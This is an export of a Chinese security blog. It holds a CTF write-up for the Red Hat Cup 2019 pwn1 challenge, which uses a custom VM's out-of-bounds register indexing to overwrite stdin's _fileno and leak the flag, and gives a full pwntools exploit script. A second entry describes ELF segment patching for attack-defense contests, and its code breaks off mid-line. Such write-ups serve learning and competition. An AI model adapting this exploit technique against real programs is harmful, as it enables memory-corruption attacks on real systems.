    <url>/2019/11/29/%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8Bpwn1/</url>
    <content><![CDATA[<p>修改<code>_fileno</code>来让<code>stdin</code>从<code>fd</code>中读数据</p>
<p>文件都在：<a href="[https://github.com/DayJun/Blogs/tree/master/Articles/2019-%E7%BA%A2%E5%B8%BD%E6%9D%AF-%E7%B2%A4%E6%B5%B7%E4%B8%AD%E5%BF%83-pwn1](https://github.com/DayJun/Blogs/tree/master/Articles/2019-红帽杯-粤海中心-pwn1)">Github</a></p>
<a id="more"></a>

<h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>最开始它获取了flag文件的文件描述符，并把它用<code>dup2</code>映射到0x233，这样我们就知道0x233是flag的文件描述符</p>
<p>然后定义了沙盒规则，不允许<code>execve</code>和<code>write</code>，且虚拟机本身只能输入0x40道指令</p>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>它在处理指令的时候，有使用寄存器中的值作为index来存取它定的内存区的数据的操作，但是它却没有对寄存器进行检查</p>
<p>如果寄存器中是负数，那它就可以存取到内存区之外的数据，导致OOB</p>
<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><ol>
<li>读取到<code>_IO_2_1_stdin_</code>的地址</li>
<li>将它加0x6c（即定位到它-4的位置)</li>
<li>将栈地址覆盖成前两步修改后的地址</li>
<li>用<code>push</code>操作把0x233写到<code>_IO_2_1_stdin_</code>的<code>_fileno</code></li>
<li>最后的<code>scanf</code>后的<code>printf</code>就会把flag打印出来</li>
</ol>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./RHVM.bin'</span></span><br><span class="line">io = process(binary)</span><br><span class="line">o = &#123;<span class="string">"give"</span>:<span class="number">0x40</span>, <span class="string">"print"</span>:<span class="number">0x60</span>, <span class="string">"sub"</span>:<span class="number">208</span>, <span class="string">'memb'</span>:<span class="number">0x42</span>&#125;</span><br><span class="line">ops = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a, b, c)</span>:</span></span><br><span class="line">    ops.append((a &lt;&lt; <span class="number">16</span>) + (b &lt;&lt; <span class="number">8</span>) + c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveBtoRA</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x40</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printS</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0x60</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAsubRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">208</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RARdengyuRBM</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x42</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAMdengyuRBR</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0x41</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAmulRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">0xc0</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAzuoyiRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">224</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RAaddRB</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    add(<span class="number">160</span>, a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pushRA</span><span class="params">(a)</span>:</span></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="number">0</span>, a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">moveBtoRA(<span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">moveBtoRA(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAsubRB(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">RAmulRB(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">RAsubRB(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line">RARdengyuRBM(<span class="number">5</span>, <span class="number">4</span>)</span><br><span class="line">moveBtoRA(<span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">moveBtoRA(<span class="number">7</span>, <span class="number">8</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAMdengyuRBR(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">RAaddRB(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line">RARdengyuRBM(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">RAMdengyuRBR(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">moveBtoRA(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">moveBtoRA(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">RAzuoyiRB(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">RAaddRB(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">pushRA(<span class="number">0</span>)</span><br><span class="line">printS()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'EIP: '</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'ESP: '</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'Give me code length: '</span>)</span><br><span class="line">sl(str(len(ops)))</span><br><span class="line">ru(<span class="string">'Give me code: '</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ops:</span><br><span class="line">    sl(str(i))</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要是利用方法对我来说比较新颖，特此记录一下</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>关于patch elf文件的一些思考</title>
    <url>/2019/11/18/%E5%85%B3%E4%BA%8Epatch-elf%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p>近日，为了能在AWD中对二进制文件进行patch，特意研究了一下elf文件结构，并找寻patch新代码的方法</p>
<a id="more"></a>

<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>新增一个<code>Segment</code>到文件最末尾</p>
<p>需要做的有以下几点：</p>
<ol>
<li>分析原文件，得到<code>Program Header</code></li>
<li>在文件最末尾添加新的<code>Program Header</code>，原<code>Program Header</code>废置，并再添加一个<code>LOAD Segment</code></li>
<li>此<code>LOAD Segment</code>的<code>p_offset</code>字段为此时文件最末尾，将其它字段设置妥当</li>
<li>修改<code>ELF Header</code>中的<code>e_phoffset</code>和<code>e_phnum</code>，使它适应新的<code>Program Header</code></li>
<li>在文件最末尾也就是新添加的<code>LOAD Segment</code>的<code>p_offset</code>所指添加code</li>
</ol>
<p>这样就基本可以做到添加一个<code>LOAD Segment</code>来加载新patch的代码到内存了</p>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>尽管<code>readelf</code>和<code>objdump</code>都正常加载并输出了，但是如果想要执行文件却会报错。原因是加载elf文件过程中，<code>dl_main</code>或者其之前的某个函数想要载入一个并未被映射到虚拟内存空间的内存，就导致了报错</p>
<p>具体原因我并未查明，我只知道这个地址是<code>.text</code>段的地址</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> X86_INS_PUSH</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Ehdr</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"e_ident"</span>, c_ubyte * <span class="number">16</span>),</span><br><span class="line">        (<span class="string">"e_type"</span>, c_ushort), </span><br><span class="line">        (<span class="string">"e_machine"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_version"</span>, c_uint),</span><br><span class="line">        (<span class="string">"e_entry"</span>, c_uint),</span><br><span class="line">        (<span class="string">"e_phoff"</span>, c_uint),    <span class="comment"># program header offset</span></span><br><span class="line">        (<span class="string">"e_shoff"</span>, c_uint),    <span class="comment"># section header offset</span></span><br><span class="line">        (<span class="string">"e_flags"</span>, c_uint),</span><br><span class="line">        (<span class="string">"e_ehsize"</span>, c_ushort), <span class="comment"># elf header's size</span></span><br><span class="line">        (<span class="string">"e_phentsize"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_phnum"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_shentsize"</span>, c_ushort),  <span class="comment"># a section header's size</span></span><br><span class="line">        (<span class="string">"e_shnum"</span>, c_ushort),  <span class="comment"># section header's num</span></span><br><span class="line">        (<span class="string">"e_shstrndx"</span>, c_ushort)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Ehdr</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"e_ident"</span>, c_ubyte * <span class="number">16</span>),</span><br><span class="line">        (<span class="string">"e_type"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_machine"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_version"</span>, c_uint),</span><br><span class="line">        (<span class="string">"e_entry"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"e_phoff"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"e_shoff"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"e_flags"</span>, c_uint),</span><br><span class="line">        (<span class="string">"e_ehsize"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_phentsize"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_phnum"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_shentsize"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_shnum"</span>, c_ushort),</span><br><span class="line">        (<span class="string">"e_shstrndx"</span>, c_ushort)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Phdr</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"p_type"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_flags"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_offset"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_vaddr"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_paddr"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_filesz"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_memsz"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_align"</span>, c_uint)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Phdr</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"p_type"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_flags"</span>, c_uint),</span><br><span class="line">        (<span class="string">"p_offset"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"p_vaddr"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"p_paddr"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"p_filesz"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"p_memsz"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"p_align"</span>, c_ulonglong)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Shdr</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"sh_name"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_type"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_flags"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_addr"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_offset"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_size"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_link"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_info"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_addralign"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_entsize"</span>, c_uint)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Shdr</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"sh_name"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_type"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_flags"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"sh_addr"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"sh_offset"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"sh_size"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"sh_link"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_info"</span>, c_uint),</span><br><span class="line">        (<span class="string">"sh_addralign"</span>, c_ulonglong),</span><br><span class="line">        (<span class="string">"sh_entsize"</span>, c_ulonglong)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_rel</span><span class="params">(LittleEndianStructure)</span>:</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"r_offset"</span>, c_uint),</span><br><span class="line">        (<span class="string">"r_info"</span>, c_uint)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Plt_struct</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, plt_address, got_address, name)</span>:</span></span><br><span class="line">        self.plt_address = plt_address</span><br><span class="line">        self.got_address = got_address</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ELF</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, binary)</span>:</span></span><br><span class="line">        self.bin = bytearray(binary)</span><br><span class="line">        self.modifiedBin = []</span><br><span class="line">        self.elfHeader = <span class="literal">None</span></span><br><span class="line">        self.mode = <span class="literal">None</span></span><br><span class="line">        self.arch = <span class="literal">None</span></span><br><span class="line">        self.entry = <span class="literal">None</span></span><br><span class="line">        self.modifiedPos = <span class="number">0</span></span><br><span class="line">        self.programHeaders = []</span><br><span class="line">        self.sectionHeaders = []</span><br><span class="line">        self.sortSectionHeaders = []</span><br><span class="line">        self.plt = []</span><br><span class="line">        self.judgeClass()</span><br><span class="line">        self.judgeMachine()</span><br><span class="line">        self.judgeMagic()</span><br><span class="line">        self.setEentry()</span><br><span class="line">        self.getPlt()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set x86 elf header</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set32HeaderElf</span><span class="params">(self)</span>:</span></span><br><span class="line">        elf32_ehdr = self.bin[<span class="number">0</span>:]</span><br><span class="line">        self.elfHeader = Elf32_Ehdr.from_buffer_copy(elf32_ehdr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set x86_64 header</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set64HeaderElf</span><span class="params">(self)</span>:</span></span><br><span class="line">        elf64_ehdr = self.bin[<span class="number">0</span>:]</span><br><span class="line">        self.elfHeader = Elf64_Ehdr.from_buffer_copy(elf64_ehdr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># judge magic</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judgeMagic</span><span class="params">(self)</span>:</span></span><br><span class="line">        magic = bytearray(self.elfHeader.e_ident[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> magic != <span class="string">'\x7fELF'</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"only support ELF"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># jugge it is x86 or x86_64</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judgeClass</span><span class="params">(self)</span>:</span></span><br><span class="line">        ei_class = self.bin[<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span> ei_class == <span class="number">0x1</span>:</span><br><span class="line">            self.mode = CS_MODE_32</span><br><span class="line">            self.set32HeaderElf()</span><br><span class="line">            self.set32HeaderProgram()</span><br><span class="line">            self.set32HeaderSection()</span><br><span class="line">        <span class="keyword">elif</span> ei_class == <span class="number">0x2</span>:</span><br><span class="line">            self.mode = CS_MODE_64</span><br><span class="line">            self.set64HeaderElf()</span><br><span class="line">            self.set64HeaderProgram()</span><br><span class="line">            self.set64HeaderSection()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"unknown class whitch is not x86 or x86-64"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># just only support x86 or x86_64</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judgeMachine</span><span class="params">(self)</span>:</span></span><br><span class="line">        e_machine = self.elfHeader.e_machine</span><br><span class="line">        <span class="keyword">if</span> e_machine == <span class="number">3</span> <span class="keyword">or</span> e_machine == <span class="number">62</span>:</span><br><span class="line">            self.arch = CS_ARCH_X86</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"just only support EM_386 or EM_X86_64"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set the entry of the program</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setEentry</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.entry = self.elfHeader.e_entry</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set x86 program header</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set32HeaderProgram</span><span class="params">(self)</span>:</span></span><br><span class="line">        e_phnum = self.elfHeader.e_phnum</span><br><span class="line">        e_phoff = self.elfHeader.e_phoff</span><br><span class="line">        elf32_phdr = self.bin[e_phoff:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(e_phnum):</span><br><span class="line">            self.programHeaders.append(Elf32_Phdr.from_buffer_copy(elf32_phdr))</span><br><span class="line">            elf32_phdr = elf32_phdr[self.elfHeader.e_phentsize:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set x86_64 program header</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set64HeaderProgram</span><span class="params">(self)</span>:</span></span><br><span class="line">        e_phnum = self.elfHeader.e_phnum</span><br><span class="line">        e_phoff = self.elfHeader.e_phoff</span><br><span class="line">        elf64_phdr = self.bin[e_phoff:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(e_phnum):</span><br><span class="line">            self.programHeaders.append(Elf64_Phdr.from_buffer_copy(elf64_phdr))</span><br><span class="line">            elf64_phdr = elf64_phdr[self.elfHeader.e_phentsize:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set x86 section header</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set32HeaderSection</span><span class="params">(self)</span>:</span></span><br><span class="line">        e_shnum = self.elfHeader.e_shnum</span><br><span class="line">        e_shoff = self.elfHeader.e_shoff</span><br><span class="line">        elf32_shdr = self.bin[e_shoff:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(e_shnum):</span><br><span class="line">            self.sectionHeaders.append(Elf32_Shdr.from_buffer_copy(elf32_shdr))</span><br><span class="line">            elf32_shdr = elf32_shdr[self.elfHeader.e_shentsize:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set x86_64 section header</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set64HeaderSection</span><span class="params">(self)</span>:</span></span><br><span class="line">        e_shnum = self.elfHeader.e_shnum</span><br><span class="line">        e_shoff = self.elfHeader.e_shoff</span><br><span class="line">        elf64_shdr = self.bin[e_shoff:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(e_shnum):</span><br><span class="line">            self.sectionHeaders.append(Elf64_Shdr.from_buffer_copy(elf64_shdr))</span><br><span class="line">            elf64_shdr = elf64_shdr[self.elfHeader.e_shentsize:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># find section by it's name</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findSectionByName</span><span class="params">(self, section_name)</span>:</span></span><br><span class="line">        e_shstrndx = self.elfHeader.e_shstrndx</span><br><span class="line">        shstrtab = self.sectionHeaders[e_shstrndx]</span><br><span class="line">        offset = shstrtab.sh_offset</span><br><span class="line">        shstrtab_bytes = self.bin[offset:]</span><br><span class="line">        <span class="keyword">for</span> section <span class="keyword">in</span> self.sectionHeaders:</span><br><span class="line">            idx = section.sh_name</span><br><span class="line">            <span class="keyword">while</span> shstrtab_bytes[idx] != <span class="number">0</span>:</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">            shstr = shstrtab_bytes[section.sh_name:idx]</span><br><span class="line">            <span class="keyword">if</span> shstr == section_name:</span><br><span class="line">                <span class="keyword">return</span> section</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"no such section called "</span> + section_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the content of the section</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSectionContent</span><span class="params">(self, section)</span>:</span></span><br><span class="line">        offset = section.sh_offset</span><br><span class="line">        size = section.sh_size</span><br><span class="line">        content = self.bin[offset:offset+size]</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getLOADSegment</span><span class="params">(self)</span>:</span></span><br><span class="line">        LOAD = []</span><br><span class="line">        ph = self.programHeaders</span><br><span class="line">        <span class="keyword">for</span> segment <span class="keyword">in</span> ph:</span><br><span class="line">            <span class="keyword">if</span> segment.p_type == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> segment</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack</span><span class="params">(self, d)</span>:</span></span><br><span class="line">        res = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> field_name, field_type <span class="keyword">in</span> d._fields_:</span><br><span class="line">            t = field_type</span><br><span class="line">            i = getattr(d, field_name)</span><br><span class="line">            <span class="keyword">if</span> t == c_uint:</span><br><span class="line">                res += struct.pack(<span class="string">'I'</span>, i)</span><br><span class="line">            <span class="keyword">elif</span> t == c_ubyte:</span><br><span class="line">                res += struct.pack(<span class="string">'B'</span>, i)</span><br><span class="line">            <span class="keyword">elif</span> t == c_ulonglong:</span><br><span class="line">                res += struct.pack(<span class="string">'Q'</span>, i)</span><br><span class="line">            <span class="keyword">elif</span> t == c_ushort:</span><br><span class="line">                res += struct.pack(<span class="string">'H'</span>, i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    length = field_type._length_</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> i:</span><br><span class="line">                        res += struct.pack(<span class="string">'b'</span>, item)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">return</span> bytearray(res)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">align</span><span class="params">(self, res)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (len(res)+<span class="number">15</span>) &amp; ~<span class="number">15</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modifyProgramHeader</span><span class="params">(self, p, l, sz=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> sz == <span class="literal">False</span>:</span><br><span class="line">            p.p_offset += l</span><br><span class="line">            p.p_paddr += l</span><br><span class="line">            p.p_vaddr += l</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.p_memsz += l</span><br><span class="line">            p.p_filesz += l</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modifySectionHeader</span><span class="params">(self, s, l, sz=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> sz == <span class="literal">False</span>:</span><br><span class="line">            s.sh_offset += l</span><br><span class="line">            <span class="keyword">if</span> s.sh_addr != <span class="number">0</span>:</span><br><span class="line">                s.sh_addr += l</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s.sh_size += l</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, res, c, f, r = None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="literal">None</span>:</span><br><span class="line">            l = len(c)</span><br><span class="line">            res[f:f+l] = c</span><br><span class="line">            self.modifiedPos = f+l</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c += r</span><br><span class="line">            self.add(res, c, f)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getPlt</span><span class="params">(self)</span>:</span></span><br><span class="line">        dynstrSection = self.findSectionByName(<span class="string">'.dynstr'</span>)</span><br><span class="line">        dynstr_offset = dynstrSection.sh_offset</span><br><span class="line">        dynsymSection = self.findSectionByName(<span class="string">'.dynsym'</span>)</span><br><span class="line">        dynsym_offset = dynsymSection.sh_offset</span><br><span class="line">        pltSection = self.findSectionByName(<span class="string">'.plt'</span>)</span><br><span class="line">        plt_offset = pltSection.sh_offset</span><br><span class="line">        plt_entSize = pltSection.sh_entsize</span><br><span class="line">        rel_pltSection = self.findSectionByName(<span class="string">'.rela.plt'</span>)</span><br><span class="line">        rel_plt_offset = rel_pltSection.sh_offset</span><br><span class="line">        rel_plt_size = rel_pltSection.sh_size</span><br><span class="line">        rel_plt_entSize = rel_pltSection.sh_entsize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(rel_plt_offset, rel_plt_offset+rel_plt_size, rel_plt_entSize):</span><br><span class="line">            itemSize = rel_plt_entSize // <span class="number">3</span></span><br><span class="line">            data = self.bin[i:i+rel_plt_size][:itemSize*<span class="number">2</span>]</span><br><span class="line">            got_address = struct.unpack(<span class="string">"Q"</span>, data[:itemSize])[<span class="number">0</span>]</span><br><span class="line">            r_info = struct.unpack(<span class="string">"Q"</span>, data[itemSize:])[<span class="number">0</span>] &gt;&gt; <span class="number">32</span></span><br><span class="line">            sectionDynsym_offset = dynsym_offset + r_info * <span class="number">0x18</span></span><br><span class="line">            st_name = struct.unpack(<span class="string">"I"</span>, self.bin[sectionDynsym_offset:sectionDynsym_offset+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">            idx = dynstr_offset + 